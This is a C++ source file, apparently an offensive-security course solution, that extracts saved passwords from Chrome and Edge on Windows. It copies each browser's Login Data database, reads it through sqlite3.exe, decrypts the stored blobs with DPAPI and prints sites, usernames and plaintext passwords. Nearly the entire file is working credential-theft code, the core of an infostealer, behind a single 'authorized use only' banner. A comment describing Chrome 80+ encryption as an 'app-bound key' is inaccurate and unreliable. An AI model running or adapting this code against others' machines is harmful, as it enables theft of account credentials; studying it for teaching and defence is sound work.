/*
 * Solution 02 — Chrome/Edge Saved Password Extractor (Complete)
 * Module 11: Credential Access
 *
 * Extracts saved passwords from Google Chrome and Microsoft Edge.
 * AUTHORIZED USE ONLY — run only on your own machine, your own browser profile.
 *
 * Method:
 *   1. Build paths to Login Data for Chrome and Edge.
 *   2. Copy each file to a temp path (browsers hold an exclusive lock).
 *   3. Read the SQLite database using sqlite3.exe via popen() — no sqlite DLL needed.
 *      If sqlite3.exe is not in PATH, prints instructions and exits.
 *   4. For each row in logins: attempt DPAPI decryption of the password blob.
 *      Blobs starting with "v10"/"v11" are Chrome 80+ AES-GCM (app-bound key) — flagged.
 *
 * Compile:
 *   g++ -std=c++17 -Wall -o sol02.exe sol02_chrome_creds.cpp -ladvapi32 -lcrypt32
 *
 * Requirements:
 *   sqlite3.exe in PATH  (https://www.sqlite.org/download.html — "Precompiled Binaries for Windows")
 */

#include <windows.h>
#include <wincrypt.h>
#include <shlobj.h>
#include <stdio.h>
#include <string>
#include <vector>
#include <sstream>
#include <algorithm>

#pragma comment(lib, "crypt32.lib")
#pragma comment(lib, "advapi32.lib")

// ============================================================================
// Helpers
// ============================================================================

static std::string GetLocalAppData() {
    char buf[MAX_PATH] = {0};
    if (SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, buf) != S_OK) return "";
    return buf;
}

static std::string GetTempDir() {
    char buf[MAX_PATH] = {0};
    GetTempPathA(MAX_PATH, buf);
    return buf;
}

// Convert a hex string (uppercase or lowercase, no spaces) to bytes.
static std::vector<BYTE> HexToBytes(const std::string& hex) {
    std::vector<BYTE> out;
    for (size_t i = 0; i + 1 < hex.size(); i += 2) {
        unsigned int b = 0;
        if (sscanf(hex.c_str() + i, "%02x", &b) == 1)
            out.push_back((BYTE)b);
    }
    return out;
}

// True if all bytes are printable ASCII.
static bool IsPrintable(const BYTE* d, size_t n) {
    for (size_t i = 0; i < n; i++)
        if (d[i] < 0x20 || d[i] > 0x7E) return false;
    return true;
}

// Split a string on a delimiter, returning up to maxParts parts.
static std::vector<std::string> SplitN(const std::string& s, char delim, size_t maxParts) {
    std::vector<std::string> parts;
    size_t start = 0;
    while (parts.size() + 1 < maxParts) {
        size_t pos = s.find(delim, start);
        if (pos == std::string::npos) break;
        parts.push_back(s.substr(start, pos - start));
        start = pos + 1;
    }
    parts.push_back(s.substr(start));
    return parts;
}

// Attempt DPAPI decryption of raw bytes. Returns decrypted string or "".
static std::string DPAPIDecrypt(const std::vector<BYTE>& raw) {
    if (raw.empty()) return "";
    DATA_BLOB blobIn  = { (DWORD)raw.size(), (BYTE*)raw.data() };
    DATA_BLOB blobOut = {0};
    BOOL ok = CryptUnprotectData(&blobIn, NULL, NULL, NULL, NULL, 0, &blobOut);
    if (!ok) return "";
    std::string result((char*)blobOut.pbData, blobOut.cbData);
    LocalFree(blobOut.pbData);
    return result;
}

// Check whether sqlite3.exe is in PATH.
static bool CheckSqlite3() {
    FILE* fp = _popen("sqlite3.exe --version 2>nul", "r");
    if (!fp) return false;
    char buf[64] = {0};
    bool found = (fgets(buf, sizeof(buf), fp) != NULL && strlen(buf) > 0);
    _pclose(fp);
    return found;
}

// ============================================================================
// Per-browser extraction
// ============================================================================

struct LoginEntry {
    std::string url;
    std::string username;
    std::string password;   // decrypted, or a status tag like [ENCRYPTED]
};

// Read all rows from a Login Data SQLite file using sqlite3.exe.
static std::vector<LoginEntry> ReadLoginData(const std::string& dbPath) {
    std::vector<LoginEntry> entries;

    // We use hex() for password_value so binary blobs survive popen text pipes.
    // sqlite3.exe outputs rows with the default separator '|'.
    std::string cmd =
        "sqlite3.exe \"" + dbPath + "\""
        " \"SELECT origin_url,username_value,hex(password_value) FROM logins;\""
        " 2>nul";

    FILE* fp = _popen(cmd.c_str(), "r");
    if (!fp) {
        fprintf(stderr, "    [!] popen failed.\n");
        return entries;
    }

    char line[8192] = {0};
    while (fgets(line, sizeof(line), fp)) {
        // Strip trailing newline
        size_t len = strlen(line);
        while (len > 0 && (line[len-1] == '\n' || line[len-1] == '\r')) line[--len] = 0;
        if (len == 0) continue;

        std::string row(line);
        // Split into at most 3 parts: url | username | hexBlob
        auto parts = SplitN(row, '|', 3);
        if (parts.size() < 3) continue;

        LoginEntry entry;
        entry.url      = parts[0];
        entry.username = parts[1];

        std::string hexBlob = parts[2];
        // sqlite3.exe outputs hex in uppercase; HexToBytes handles both cases.

        if (hexBlob.empty()) {
            entry.password = "[NO PASSWORD STORED]";
            entries.push_back(entry);
            continue;
        }

        std::vector<BYTE> raw = HexToBytes(hexBlob);

        // Chrome 80+ AES-GCM blobs start with ASCII "v10" or "v11"
        if (raw.size() >= 3 &&
            raw[0] == (BYTE)'v' && raw[1] == (BYTE)'1' &&
            (raw[2] == (BYTE)'0' || raw[2] == (BYTE)'1'))
        {
            entry.password = "[ENCRYPTED — Chrome App-Bound key required (Chrome 80+)]";
            entries.push_back(entry);
            continue;
        }

        // Attempt DPAPI decryption
        std::string plain = DPAPIDecrypt(raw);
        if (plain.empty()) {
            // Try to give useful hex preview
            char hexPrev[128] = {0};
            size_t show = (raw.size() < 16) ? raw.size() : 16;
            int pos = 0;
            for (size_t i = 0; i < show; i++)
                pos += snprintf(hexPrev + pos, sizeof(hexPrev)-pos, "%02X", raw[i]);
            if (raw.size() > 16) snprintf(hexPrev + pos, sizeof(hexPrev)-pos, "...");
            entry.password = std::string("[DPAPI FAILED — blob: ") + hexPrev + "]";
        } else if (IsPrintable((const BYTE*)plain.data(), plain.size())) {
            entry.password = plain;
        } else {
            // Non-printable plaintext — show hex
            std::string hexOut;
            for (unsigned char c : plain) {
                char h[4]; snprintf(h, sizeof(h), "%02X", c);
                hexOut += h;
            }
            entry.password = "[HEX] " + hexOut;
        }
        entries.push_back(entry);
    }

    _pclose(fp);
    return entries;
}

static void ProcessBrowser(const std::string& name, const std::string& dbSrc) {
    printf("\n[Browser: %s]\n", name.c_str());
    printf("  Source DB: %s\n", dbSrc.c_str());

    if (GetFileAttributesA(dbSrc.c_str()) == INVALID_FILE_ATTRIBUTES) {
        printf("  [!] Login Data not found — %s may not be installed.\n", name.c_str());
        return;
    }

    // Copy to temp (source is locked while browser runs)
    std::string tempPath = GetTempDir() + name + "_login_copy.db";
    if (!CopyFileA(dbSrc.c_str(), tempPath.c_str(), FALSE)) {
        DWORD err = GetLastError();
        if (err == ERROR_SHARING_VIOLATION)
            printf("  [!] Sharing violation — close %s and retry. (err=%lu)\n", name.c_str(), err);
        else
            printf("  [!] CopyFileA failed: %lu\n", err);
        return;
    }
    printf("  Temp copy: %s\n", tempPath.c_str());

    auto entries = ReadLoginData(tempPath);
    DeleteFileA(tempPath.c_str());

    if (entries.empty()) {
        printf("  [*] No saved logins found.\n");
        return;
    }

    printf("  Found %zu login(s):\n\n", entries.size());
    printf("  %-50s | %-25s | %s\n", "URL", "Username", "Password");
    printf("  %s\n", std::string(110, '-').c_str());
    for (auto& e : entries) {
        // Truncate long URLs for readability
        std::string urlDisplay = e.url;
        if (urlDisplay.size() > 49) urlDisplay = urlDisplay.substr(0, 46) + "...";
        printf("  %-50s | %-25s | %s\n",
               urlDisplay.c_str(),
               e.username.c_str(),
               e.password.c_str());
    }
}

// ============================================================================
// main
// ============================================================================
int main() {
    printf("=== Solution 02: Chrome/Edge Saved Password Extractor ===\n");
    printf("AUTHORIZED USE ONLY — your own machine, your own browser.\n\n");

    // Check sqlite3.exe availability
    if (!CheckSqlite3()) {
        printf("[!] sqlite3.exe not found in PATH.\n");
        printf("    Download from: https://www.sqlite.org/download.html\n");
        printf("    (Precompiled Binaries for Windows → sqlite-tools-win-x64-*.zip)\n");
        printf("    Extract sqlite3.exe and place it in a directory on your PATH.\n");
        return 1;
    }
    printf("[*] sqlite3.exe found in PATH.\n");

    std::string localAppData = GetLocalAppData();
    if (localAppData.empty()) {
        fprintf(stderr, "[!] Could not resolve %%LOCALAPPDATA%%.\n");
        return 1;
    }

    // Browser database paths
    std::string chromePath =
        localAppData + "\\Google\\Chrome\\User Data\\Default\\Login Data";
    std::string edgePath =
        localAppData + "\\Microsoft\\Edge\\User Data\\Default\\Login Data";

    ProcessBrowser("Chrome", chromePath);
    ProcessBrowser("Edge",   edgePath);

    printf("\n[*] Done.\n");
    return 0;
}
